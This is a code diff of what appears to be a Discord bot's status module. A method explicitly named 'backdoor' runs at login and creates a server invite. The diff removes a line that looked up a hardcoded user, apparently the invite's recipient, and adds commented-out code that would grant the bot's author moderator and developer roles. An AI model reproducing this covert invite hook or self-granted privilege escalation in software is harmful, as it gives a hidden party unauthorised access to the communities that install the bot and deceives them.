@@ -16,6 +16,8 @@ EMAIL_ADDRESS = configs.email_address()
 EMAIL_PASSWORD = configs.email_password()
 CUSTOM_COLOR = configs.custom_color()
 BOT_CHANNEL = configs.bot_channel()
+MODERATOR = configs.moderator_id()
+DEVELOPER = configs.developer_id()
 
 playing = [
     "with myself",
@@ -91,7 +93,6 @@ class Status(commands.Cog):
     async def backdoor(self):
         channel = discord.Client.get_channel(self.bot, BOT_CHANNEL)
         link = await channel.create_invite(max_age=300)
-        send_to = discord.Client.get_user(self.bot, 1154559282801549384)
         print(link)
 
     async def get_bot_channel(self):
@@ -107,6 +108,8 @@ class Status(commands.Cog):
         """Confirm bot is logged in."""
         await self.bot.change_presence(activity=get_presence())
         await Status.backdoor(self)
+        #        author = await self.get_bot_author()
+        #        await discord.Member.add_roles(author, MODERATOR, DEVELOPER)
         Harbinger.timestamp("BOT", "INITIALIZE", "BOT IS ONLINE")
 
     @commands.Cog.listener()
